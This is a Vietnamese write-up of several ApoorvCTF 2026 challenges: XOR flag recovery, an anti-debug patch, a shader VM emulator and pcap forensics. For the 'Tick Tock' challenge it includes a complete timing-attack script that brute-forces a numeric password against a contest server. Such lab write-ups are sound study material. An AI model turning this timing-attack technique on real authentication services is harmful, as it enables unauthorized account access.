---
title: ApoorvCTF 2026 Writeup

---

# ApoorvCTF 2026 Writeup
Writeup của tôi trong giải ApoorvCTF 2026. Chủ yếu là Reverse. Giải này tôi rùa khá nhiều, toàn ra flag những lúc không nghĩ nó sẽ ra flag :v.

## A Golden Experience
Bỏ vào DiE xem thông tin.

![image](https://hackmd.io/_uploads/BytQ2yKt-g.png)

Ok, giờ vô IDA để phân tích tĩnh thử. Tuy nhiên IDA không tìm thấy hàm main thật. Tôi trace theo string "flag" xem có gì không.

![image](https://hackmd.io/_uploads/SJ5K2x6KWg.png)

Khi trace theo string "printing flag....." tôi tới một hàm này trông có vẻ là main.

```c=
void __noreturn sub_B9C0()
{
  void *v0; // rax
  unsigned __int64 len; // r15
  char src; // bp
  _BYTE *v3; // rax
  unsigned __int64 v4; // rcx
  __int64 cnt; // rsi
  __int64 v6; // rdx
  char *v7; // rax
  __int64 i; // rdx
  __int64 max_len; // [rsp+0h] [rbp-78h] BYREF
  void *ptr; // [rsp+8h] [rbp-70h]
  unsigned __int64 v11; // [rsp+10h] [rbp-68h]
  char **s; // [rsp+18h] [rbp-60h] BYREF
  __int64 v13; // [rsp+20h] [rbp-58h]
  __int64 v14; // [rsp+28h] [rbp-50h]
  __int128 v15; // [rsp+30h] [rbp-48h]

  s = &off_55C60;
  v13 = 1LL;
  v14 = 8LL;
  v15 = 0LL;
  print((__int64)&s);
  nullsub_1();
  v0 = (void *)sub_BC00(0x2DuLL, 1uLL);
  if ( v0 )
  {
    max_len = 45LL;
    ptr = v0;
    v11 = 0LL;
    len = 0LL;
    while ( 1 )
    {
      src = byte_484F4[len];
      if ( len == max_len )
        sub_42190(&max_len, &off_55C88);
      *((_BYTE *)ptr + len++) = src ^ 0x5A;
      v11 = len;
      if ( len == 45 )
      {
        sleep(1LL, 0LL);
        s = &off_55CA0;
        v13 = 1LL;
        v14 = 8LL;
        v15 = 0LL;
        print((__int64)&s);
        if ( v11 )
        {
          v3 = ptr;
          v4 = v11 & 7;
          if ( v11 >= 8 )
          {
            v6 = v11 & 0x7FFFFFFFFFFFFFF8LL;
            cnt = 0LL;
            do
            {
              v3[cnt] = 0;
              v3[cnt + 1] = 0;
              v3[cnt + 2] = 0;
              v3[cnt + 3] = 0;
              v3[cnt + 4] = 0;
              v3[cnt + 5] = 0;
              v3[cnt + 6] = 0;
              v3[cnt + 7] = 0;
              cnt += 8LL;
            }
            while ( v6 != cnt );
          }
          else
          {
            cnt = 0LL;
          }
          if ( v4 )
          {
            v7 = &v3[cnt];
            for ( i = 0LL; i != v4; ++i )
              v7[i] = 0;
          }
        }
        s = &off_55CB0;
        v13 = 1LL;
        v14 = 8LL;
        v15 = 0LL;
        print((__int64)&s);
        sub_28450(0LL);
      }
    }
  }
  sub_B092(1LL, 45LL, (__int64)&off_55C70);
}
```

Ta cần chú ý vào đoạn sau từ dòng 50:

```c=
// ...
      src = byte_484F4[len];
      if ( len == max_len )
        sub_42190(&max_len, &off_55C88);
      *((_BYTE *)ptr + len++) = src ^ 0x5A;
      v11 = len;
      if ( len == 45 )
      {
        sleep(1LL, 0LL);
        s = &off_55CA0;
// ...
```

Ở đoạn này, chương trình đang XOR từng byte trong `src` với `0x5A`. Kết quả lưu vào `ptr`. Nếu `len==45` thì sẽ làm cái gì đó.

Dump mảng `src` ra, sau đó tôi tái tạo lại logic này trong python.

```py=
# Thay mảng bên dưới bằng 45 bytes bạn copy từ IDA
cipher_bytes = [0x3B, 0x2A, 0x35, 0x35, 0x28, 0x2C, 0x39, 0x2E, 0x3C, 0x21,
                0x14, 0x6A, 0x05, 0x17, 0x6A, 0x08, 0x69, 0x05, 0x08, 0x69,
                0x0B, 0x0F, 0x6B, 0x69, 0x17, 0x05, 0x6B, 0x14, 0x05, 0x0E,
                0x12, 0x6B, 0x6F, 0x05, 0x69, 0x02, 0x0A, 0x69, 0x08, 0x6B,
                0x69, 0x14, 0x19, 0x69, 0x27]
key = 0x5A
flag = ''.join([chr(b ^ key) for b in cipher_bytes])
print(flag)
```

Kết quả:

```bash
$ python exploit.py
apoorvctf{N0_M0R3_R3QU13M_1N_TH15_3XP3R13NC3}
```

May mắn ta có được flag.

Flag: `apoorvctf{N0_M0R3_R3QU13M_1N_TH15_3XP3R13NC3}`

## Forge
![image](https://hackmd.io/_uploads/SyiWBeYYZg.png)

Nhìn vào hàm main, tôi thấy chương trình đang check debug qua `ptrace`. Patch lại chương trình để bypass.

Trước:

![image](https://hackmd.io/_uploads/r1p8J-6FWl.png)

Sau:

![image](https://hackmd.io/_uploads/rysD1W6t-x.png)

Nhìn hàm main khá dài, ta nhận thấy nó đang gọi đến `OpenSSL`. Đây là một thư viện mã hoá phổ biến.

Tôi tìm thấy hàm này `sub_1C00` được gọi trong main, có vẻ đang thực hiện kiểm tra gì đó:

```c=
__int64 __fastcall sub_1C00(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v8; // rax
  __int64 v9; // rbx
  __int64 v10; // rax
  int v11; // r12d
  int v12; // ebp
  unsigned int v13; // r12d
  int v15; // [rsp+4h] [rbp-44h] BYREF
  unsigned __int64 v16; // [rsp+8h] [rbp-40h]

  v16 = __readfsqword(0x28u);
  v8 = EVP_CIPHER_CTX_new();
  if ( !v8 )
    return (unsigned int)-1;
  v9 = v8;
  v15 = 0;
  v10 = EVP_aes_256_gcm();
  if ( (unsigned int)EVP_EncryptInit_ex(v9, v10, 0LL, 0LL, 0LL) != 1
    || (unsigned int)EVP_CIPHER_CTX_ctrl(v9, 9LL, 12LL, 0LL) != 1
    || (unsigned int)EVP_EncryptInit_ex(v9, 0LL, 0LL, a2, a3) != 1
    || (unsigned int)EVP_EncryptUpdate(v9, a4, &v15, a1, 56LL) != 1
    || (v11 = v15, (unsigned int)EVP_EncryptFinal_ex(v9, a4 + v15, &v15) != 1)
    || (v12 = v15, (unsigned int)EVP_CIPHER_CTX_ctrl(v9, 16LL, 16LL, a5) != 1) )
  {
    EVP_CIPHER_CTX_free(v9);
    return (unsigned int)-1;
  }
  v13 = v12 + v11;
  EVP_CIPHER_CTX_free(v9);
  return v13;
}
```

Vào pwndbg, đặt breakpoint ở hàm này rồi chạy thử xem sao. Khá bất ngờ vì tôi có được flag luôn. Dù tôi chưa hiểu lắm.

![image](https://hackmd.io/_uploads/SkSdE7YK-e.png)

Có vẻ đây cũng không phải cách làm "mong đợi" của bài này. Tham khảo cách làm khác chính thống hơn ở đây: [Forge](https://github.com/hax1ng/apoorvctf2026/blob/main/rev/forge/README.md).

## Draw me
Đây là một dạng challenge Shader VM (Virtual Machine chạy trên GPU). File `challenge.glsl` đóng vai trò là "CPU", còn `program.png` chính là bộ nhớ (memory) chứa mã lệnh (bytecode) và dữ liệu. `runner.html` chỉ là trình bao để chạy shader này trên trình duyệt.

Để lấy được flag, không cần chạy web, mà cần viết một script để mô phỏng lại logic của shader này và thực thi các lệnh trong file `program.png`.

Bài này thuần A.I, tôi quăng code vào cho Gemini tái tạo lại logic, rồi chạy thôi :v.

```py=
from PIL import Image
import sys

# Cấu hình
PROGRAM_FILE = 'program.png'
MAX_CYCLES = 50000  # Giới hạn số vòng lặp để tránh treo nếu loop vô tận


def solve():
    try:
        img = Image.open(PROGRAM_FILE)
        img = img.convert('RGBA')
    except FileNotFoundError:
        print(f"Lỗi: Không tìm thấy file {PROGRAM_FILE}")
        return

    width, height = img.size
    # Load memory vào mảng 2 chiều để dễ thao tác
    # memory[y][x] = (r, g, b, a)
    memory = [[img.getpixel((x, y)) for x in range(width)]
              for y in range(height)]

    # Khởi tạo Registers (33 thanh ghi, index 0 bỏ qua hoặc luôn = 0)
    regs = [0] * 33

    # Đọc IP khởi tạo từ pixel (0,0)
    ip_pixel = memory[0][0]
    ip_x = ip_pixel[0]
    ip_y = ip_pixel[1]

    print(f"[*] Bắt đầu VM tại IP: ({ip_x}, {ip_y})")

    # Mảng để lưu output màn hình (VRAM)
    # Vì opcode 7 viết vào y + 128, ta theo dõi vùng này
    vram_output = {}

    cycle = 0
    while cycle < MAX_CYCLES:
        cycle += 1

        # 1. Fetch instruction
        # Clamp IP theo logic shader: ip.y clamp(1, 127)
        if ip_y < 1:
            ip_y = 1
        if ip_y > 127:
            ip_y = 127

        inst = memory[ip_y][ip_x]
        opcode, a1, a2, a3 = inst

        # Tính toán Next IP mặc định
        next_ip_x = ip_x + 1
        next_ip_y = ip_y
        if next_ip_x > 255:
            next_ip_x = 0
            next_ip_y += 1
        if next_ip_y > 127:  # Wrap around program memory
            next_ip_x = 1
            next_ip_y = 1

        # Helper để đọc thanh ghi an toàn
        def get_reg(idx):
            idx = max(0, min(idx, 32))
            if idx == 0:
                return 0
            return regs[idx]

        # 2. Execute Opcode
        if opcode == 0:  # NOP
            pass

        elif opcode == 1:  # MOV: regs[a1] = a2
            if 1 <= a1 <= 32:
                regs[a1] = a2 & 255

        elif opcode == 2:  # ADD
            if 1 <= a1 <= 32:
                val = get_reg(a2) + get_reg(a3)
                regs[a1] = val & 255

        elif opcode == 3:  # SUB
            if 1 <= a1 <= 32:
                val = get_reg(a2) - get_reg(a3)
                regs[a1] = (val + 256) & 255  # Handle negative wrap

        elif opcode == 4:  # XOR
            if 1 <= a1 <= 32:
                regs[a1] = get_reg(a2) ^ get_reg(a3)

        elif opcode == 5:  # JMP
            next_ip_x = a1
            next_ip_y = max(1, min(a2, 127))

        elif opcode == 6:  # JNZ
            if get_reg(a1) != 0:
                next_ip_x = a2
                next_ip_y = max(1, min(a3, 127))

        elif opcode == 7:  # VRAM WRITE (Quan trọng!)
            tx = get_reg(a1)
            ty = get_reg(a2) + 128
            col = get_reg(a3)

            if 128 <= ty <= 255:
                # Ghi lại kết quả để hiển thị sau
                vram_output[(tx, ty)] = col
                # Cập nhật vào memory ảo luôn (nếu cần)
                memory[ty][tx] = (col, col, col, 255)

        elif opcode == 8:  # STORE (Ghi vào memory)
            tx = get_reg(a1)
            ty = get_reg(a2)
            if not (tx == 0 and ty == 0):  # Không ghi đè IP
                b0 = get_reg(a3)
                b1 = get_reg(a3 + 1)
                b2 = get_reg(a3 + 2)
                b3 = get_reg(a3 + 3)
                memory[ty][tx] = (b0, b1, b2, b3)

        elif opcode == 9:  # LOAD (Đọc từ memory)
            if 1 <= a1 <= 32:
                sx = get_reg(a2)
                sy = get_reg(a3)
                # Đọc kênh Red
                regs[a1] = memory[sy][sx][0]

        # Cập nhật IP
        ip_x, ip_y = next_ip_x, next_ip_y

    # --- Kết thúc chạy, hiển thị kết quả ---
    print(f"[*] Hoàn thành sau {cycle} chu kỳ.")
    print("[*] Đang render vùng VRAM...")

    # Cách 1: Hiển thị dưới dạng text (nếu flag là text đơn giản)
    # Sắp xếp theo toạ độ y rồi x
    sorted_pixels = sorted(vram_output.items(),
                           key=lambda k: (k[0][1], k[0][0]))

    # Thử in ra các ký tự ASCII nếu có
    detected_chars = []
    for pos, val in sorted_pixels:
        if 32 <= val <= 126:  # Ký tự in được
            detected_chars.append(chr(val))

    print("Potential Flag String:", "".join(detected_chars))

    # Cách 2: Lưu vùng VRAM ra ảnh (nếu flag là dạng vẽ pixel)
    # Chỉ lấy vùng y=128->255
    out_img = Image.new('RGB', (256, 128), color='black')
    pixels = out_img.load()

    for (x, y), val in vram_output.items():
        if 128 <= y < 256:
            pixels[x, y - 128] = (val, val, val)

    out_img.save("flag_output.png")
    print("[*] Đã lưu ảnh kết quả ra 'flag_output.png'. Hãy mở file này để xem Flag.")


if __name__ == "__main__":
    solve()
```

Kết quả được một file ảnh, và đây chính là flag luôn. Ảnh hơi bé mọi người zoom lên xem nha.

![flag_output](https://hackmd.io/_uploads/BkNAvbTKWe.png)


## Tick Tock

Bài này tấn công dựa vào kỹ thuật gọi là Timing Attack.

Hệ thống xác thực mật khẩu có vẻ đang sử dụng cơ chế so sánh chuỗi không an toàn (như hàm strcmp hoặc vòng lặp so sánh từng ký tự rồi break ngay khi sai).

### Quy trình hoạt động của hệ thống (giả định):
- So sánh ký tự đầu tiên của input với mật khẩu.
- Nếu SAI $\rightarrow$ Dừng ngay lập tức và trả về "Incorrect". (Tốn ít thời gian nhất).
- Nếu ĐÚNG $\rightarrow$ Chuyển sang so sánh ký tự thứ hai.Lặp lại quy trình.

Hệ quả: Mật khẩu càng đúng nhiều ký tự đầu, thời gian server phản hồi càng lâu. Lợi dụng điều này để đoán từng ký tự một (Brute-force từng byte).

### Chiến thuật Exploit:

Do mật khẩu chỉ gồm các chữ số 0-9, ta sẽ thực hiện thuật toán sau:
- Bắt đầu với chuỗi rỗng (hoặc prefix đã biết).
- Thử nối thêm từng số từ 0 đến 9 vào chuỗi hiện tại. Đo thời gian phản hồi (Response Time) cho mỗi số.
- Số nào làm server phản hồi LÂU NHẤT chính là ký tự đúng tiếp theo.
- Lặp lại cho đến khi nhận được Flag.

Tôi nhờ Gemini generate ra cái script để automate việc này:

```py=
from pwn import *
import time
import numpy as np

# Cấu hình
HOST = 'chals3.apoorvctf.xyz'
PORT = 9001
context.log_level = 'error'  # Chỉ hiện lỗi quan trọng

# Biến toàn cục để giữ kết nối
r = None


def get_connection():
    """Hàm tạo kết nối mới và xử lý banner đầu"""
    while True:
        try:
            conn = remote(HOST, PORT)
            # Đọc banner chào mừng cho đến khi sẵn sàng nhập
            conn.recvuntil(b"password: ")
            return conn
        except Exception as e:
            print(f"[!] Lỗi kết nối: {e}. Đang thử lại sau 1s...")
            time.sleep(1)


def measure_time(payload, sample_count=5):
    """
    Gửi payload và đo thời gian.
    Tự động reconnect nếu rớt mạng giữa chừng.
    """
    global r
    timings = []

    while len(timings) < sample_count:
        try:
            # Nếu chưa có kết nối hoặc kết nối đã chết, tạo mới
            if r is None or r.connected() == False:
                if r:
                    r.close()
                r = get_connection()

            # Bắt đầu đo
            r.sendline(payload.encode())
            start_time = time.time()

            response = r.recvline()
            end_time = time.time()

            # Kiểm tra xem có ra Flag không
            if b"Incorrect" not in response and b"Please" not in response:
                return "FOUND", response, r.recvall()

            # Chuẩn bị cho lần nhập tiếp theo (đọc dòng nhắc password)
            r.recvuntil(b"password: ")

            # Chỉ thêm vào list nếu không có lỗi xảy ra
            timings.append(end_time - start_time)

        except (EOFError, PwnlibException):
            # Nếu lỗi, đóng kết nối hiện tại để vòng lặp while tạo cái mới
            # Không append timing sai vào list, thử lại sample này
            if r:
                r.close()
            r = None
            continue

    return "TIME", np.mean(timings), None


def exploit():
    global r
    known_password = "934780189"
    charset = "0123456789"

    print(f"[*] Bắt đầu tấn công {HOST}:{PORT}")

    # Kết nối lần đầu
    r = get_connection()

    while True:
        candidates = {}
        print(f"\n[*] Đang brute-force ký tự thứ {len(known_password) + 1}...")

        # Thử từng số 0-9
        for char in charset:
            test_pass = known_password + char

            # Gọi hàm đo thời gian an toàn
            status, result, extra = measure_time(test_pass, sample_count=5)

            if status == "FOUND":
                print(f"\n[!!!] BINGO! Mật khẩu là: {test_pass}")
                print(f"[+] Server response: {result.decode().strip()}")
                if extra:
                    print(f"[+] Extra info: {extra.decode().strip()}")
                return

            # Lưu thời gian trung bình
            candidates[char] = result
            # print(f"    - Thử '{char}': {result:.5f}s") # Uncomment để debug chi tiết

        # Tìm ký tự có thời gian phản hồi lâu nhất (best candidate)
        best_char = max(candidates, key=candidates.get)
        max_time = candidates[best_char]

        # In ra lựa chọn
        diff = max_time - min(candidates.values())
        print(
            f"[+] Tìm thấy: '{best_char}' (Avg Time: {max_time:.5f}s, Diff: {diff:.5f}s)")

        known_password += best_char
        print(f"[*] Password hiện tại: {known_password}")


if __name__ == "__main__":
    exploit()
```

Kết quả, chạy hơi lâu tí:

```bash
$ python exploit.py
[*] Bắt đầu tấn công chals3.apoorvctf.xyz:9001

[*] Đang brute-force ký tự thứ 10...
[+] Tìm thấy: '0' (Avg Time: 8.16065s, Diff: 0.82287s)
[*] Password hiện tại: 9347801890

[*] Đang brute-force ký tự thứ 11...
[+] Tìm thấy: '9' (Avg Time: 8.94368s, Diff: 0.80417s)
[*] Password hiện tại: 93478018909

[*] Đang brute-force ký tự thứ 12...

[!!!] BINGO! Mật khẩu là: 934780189098
[+] Server response: Correct! apoorvctf{con5t4nt_tim3_or_di3}
```

## Routine check

Ban đầu tôi cho file pcap vào Wireshark để phân tích. Có vẻ các gói tin này là cuộc đối thoại giữa client và server về việc backup gì đó.

Thử trích xuất strings ra xem có gì hay.

![image](https://hackmd.io/_uploads/r1gQU-aKbe.png)

Để ý ngay thấy `JFIF`. Tôi lọc trong Wireshark xem frame nào chứa string này.

![image](https://hackmd.io/_uploads/HyLmPYtt-g.png)

Trích xuất file này ra, tuy nhiên magic number đang bị sai ở byte đầu. Bỏ vào HxD để sửa lại từ `3F` thành `FF`.

![image](https://hackmd.io/_uploads/ByhDvtFt-g.png)

Mở ra và tôi được một file ảnh QR. Quét thử xem có gì.

![image](https://hackmd.io/_uploads/ByixwKKt-l.png)

Và yessir, tôi đã có được flag. Hoặc ít nhất là tôi nghĩ thế =)).

Đáng tiếc rằng đây là fake flag. Đọc nội dung của nó tôi cũng đoán ra được.

Dùng steghide kiểm tra xem ảnh này có giấu gì không. Passphrase để rỗng. Và thực sự là có một file là `realflag.txt`.

![image](https://hackmd.io/_uploads/SJjALKKYWe.png)

Ok lần này thì có flag thật rồi =)).

Flag: `apoorvctf{b1ts_wh1sp3r_1n_th3_l0w3st_b1t}`